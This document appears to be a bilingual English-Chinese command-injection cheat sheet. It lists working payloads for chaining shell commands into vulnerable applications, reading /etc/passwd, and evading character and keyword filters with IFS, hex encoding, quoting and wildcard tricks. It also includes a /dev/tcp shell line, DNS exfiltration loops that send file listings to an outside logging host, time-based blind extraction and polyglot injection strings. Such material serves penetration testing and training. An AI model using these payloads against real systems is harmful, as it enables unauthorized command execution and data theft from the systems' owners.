# Command Injection - 命令注入

> 命令注入是一种安全漏洞，允许攻击者在易受攻击的应用程序中执行任意命令。

## Summary - 总结

- [Command Injection - 命令注入](#command-injection---命令注入)
  - [Summary - 总结](#summary---总结)
  - [Tools - 工具](#tools---工具)
  - [Exploits - 利用](#exploits---利用)
    - [Basic commands - 基础命令](#basic-commands---基础命令)
    - [Chaining commands - 链接命令](#chaining-commands---链接命令)
    - [Inside a command - 在命令中](#inside-a-command---在命令中)
  - [Filter Bypasses - 绕过](#filter-bypasses---绕过)
    - [Bypass without space - 空格绕过](#bypass-without-space---空格绕过)
    - [Bypass with a line return - 回车绕过](#bypass-with-a-line-return---回车绕过)
    - [Bypass with backslash newline - 反斜杠换行绕过](#bypass-with-backslash-newline---反斜杠换行绕过)
    - [Bypass characters filter via hex encoding - 十六进制绕过](#bypass-characters-filter-via-hex-encoding---十六进制绕过)
    - [Bypass characters filter - 绕过字符过滤](#bypass-characters-filter---绕过字符过滤)
    - [Bypass Blacklisted words - 绕过黑名单过滤](#bypass-blacklisted-words---绕过黑名单过滤)
      - [Bypass with single quote - 使用单引号绕过](#bypass-with-single-quote---使用单引号绕过)
      - [Bypass with double quote - 使用双引号绕过](#bypass-with-double-quote---使用双引号绕过)
      - [Bypass with backslash and slash - 使用反斜杠和斜杠绕过](#bypass-with-backslash-and-slash---使用反斜杠和斜杠绕过)
      - [Bypass with $@ - 使用$@字符绕过](#bypass-with----使用字符绕过)
    - [Bypass with $() - 使用$()字符绕过](#bypass-with----使用字符绕过-1)
      - [Bypass with variable expansion - 使用变量扩展绕过](#bypass-with-variable-expansion---使用变量扩展绕过)
      - [Bypass with wildcards - 使用通配符绕过](#bypass-with-wildcards---使用通配符绕过)
  - [Challenge - 挑战](#challenge---挑战)
  - [Time based data exfiltration - 基于时间的数据泄露](#time-based-data-exfiltration---基于时间的数据泄露)
  - [DNS based data exfiltration - 基于DNS的数据泄露](#dns-based-data-exfiltration---基于dns的数据泄露)
  - [Polyglot command injection - 多语言命令注入](#polyglot-command-injection---多语言命令注入)
  - [Backgrounding long running commands - 后台长时间命令运行](#backgrounding-long-running-commands---后台长时间命令运行)
  - [Labs](#labs)
  - [References](#references)


## Tools - 工具

- [commix - Automated All-in-One OS command injection and exploitation tool](https://github.com/commixproject/commix)

## Exploits - 利用

### Basic commands - 基础命令

```bash
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
```

### Chaining commands - 链接命令

```bash
original_cmd_by_server; ls
original_cmd_by_server && ls
original_cmd_by_server | ls
original_cmd_by_server || ls   # 第一个命令执行失败时，ls命令才能执行成功
```

也可以按换行顺序执行命令：

```bash
original_cmd_by_server
ls
```

### Inside a command - 在命令中

```bash
original_cmd_by_server `cat /etc/passwd`
original_cmd_by_server $(cat /etc/passwd)
```

## Filter Bypasses - 绕过

### Bypass without space - 空格绕过

仅对Linux生效

```bash
swissky@crashlab:~/Www$ cat</etc/passwd
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ {cat,/etc/passwd}
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

swissky@crashlab:~$ cat$IFS/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

swissky@crashlab:~$ echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
RCE
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

swissky@crashlab:~$ X=$'uname\x20-a'&&$X
Linux crashlab 4.4.X-XX-generic #72-Ubuntu

swissky@crashlab:~$ sh</dev/tcp/127.0.0.1/4242
```

不带空格、$ 或 { } 的命令执行 - Linux（仅限 Bash）

```bash
IFS=,;`cat<<<uname,-a`
```

在过滤空格的 Web 应用程序中将制表符用作分隔符

```bash
;ls%09-al%09/home
drwxr-xr-x  4 root root  4096 Jan 10 13:34 .
drwxr-xr-x 18 root root  4096 Jan 10 13:33 ..
drwx------  2 root root 16384 Jan 10 13:31 lost+found
drwxr-xr-x  4 test test  4096 Jan 13 08:30 test
```

仅对Windows生效

```bash
ping%CommonProgramFiles:~10,-18%IP
ping%PROGRAMFILES:~10,-5%IP
```

### Bypass with a line return - 回车绕过

```bash
something%0Acat%20/etc/passwd
```

You can also write files.

```bash
;cat>/tmp/hi<<EOF%0ahello%0aEOF
;cat</tmp/hi
hello
```

### Bypass with backslash newline - 反斜杠换行绕过

可以使用反斜杠后跟换行符，将命令分成几部分：

```bash
❯ cat /et\
c/pa\
sswd
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
[SNIP]
```

URL编码形式如下所示：

```bash
cat%20/et%5C%0Ac/pa%5C%0Asswd
```

### Bypass characters filter via hex encoding - 十六进制绕过

Linux

```bash
swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
/etc/passwd

swissky@crashlab:~$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764)
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
root:x:0:0:root:/root:/bin/bash
```

### Bypass characters filter - 绕过字符过滤

过滤反斜杠和斜杠的命令执行 - Linux bash

```bash
swissky@crashlab:~$ echo ${HOME:0:1}
/

swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ echo . | tr '!-0' '"-1'
/

swissky@crashlab:~$ tr '!-0' '"-1' <<< .
/

swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
root:x:0:0:root:/root:/bin/bash
```

### Bypass Blacklisted words - 绕过黑名单过滤

#### Bypass with single quote - 使用单引号绕过

```
w'h'o'am'i
```

#### Bypass with double quote - 使用双引号绕过

```
w"h"o"am"i
```

#### Bypass with backslash and slash - 使用反斜杠和斜杠绕过

```
w\ho\am\i
/\b\i\n/////s\h
```

#### Bypass with $@ - 使用$@字符绕过

```
who$@ami

echo $0
-> /usr/bin/zsh
echo whoami|$0
```

### Bypass with $() - 使用$()字符绕过

```
who$()ami
who$(echo am)i
who`echo am`i
```

#### Bypass with variable expansion - 使用变量扩展绕过

```
/???/??t /???/p??s??

test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
```

#### Bypass with wildcards - 使用通配符绕过

```
powershell C:\*\*2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
```

## Challenge - 挑战

基于前面的技巧，下面的命令是做什么的：

```
g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}


# cat /etc/issue
```

## Time based data exfiltration - 基于时间的数据泄露

提取数据：逐个字符

```
swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```

## DNS based data exfiltration - 基于DNS的数据泄露

基于工具 `https://github.com/HoLyVieR/dnsbin` 和dnsbin.zhack.ca`

```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```

在线检查基于DNS的数据泄露：

- dnsbin.zhack.ca
- pingb.in

## Polyglot command injection - 多语言命令注入

```
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

e.g:
echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/

e.g:
echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
echo "YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/"
echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/'
```

## Backgrounding long running commands - 后台长时间命令运行

在某些情况下，可能有一个长时间运行的命令。

为防止进程超时终止，可以使用nohup，在父进程退出后，进程将继续运行。

```
nohup sleep 120 > /dev/null &
```

## Labs

- [OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)
- [Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
- [Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
- [Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
- [Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)

## References

- [SECURITY CAFÉ - Exploiting Timed Based RCE](https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/)
- [Bug Bounty Survey - Windows RCE spaceless](https://web.archive.org/web/20180808181450/https://twitter.com/bugbsurveys/status/860102244171227136)
- [No PHP, no spaces, no $, no { }, bash only - @asdizzle](https://twitter.com/asdizzle_/status/895244943526170628)
- [#bash #obfuscation by string manipulation - Malwrologist, @DissectMalware](https://twitter.com/DissectMalware/status/1025604382644232192)
- [What is OS command injection - portswigger](https://portswigger.net/web-security/os-command-injection)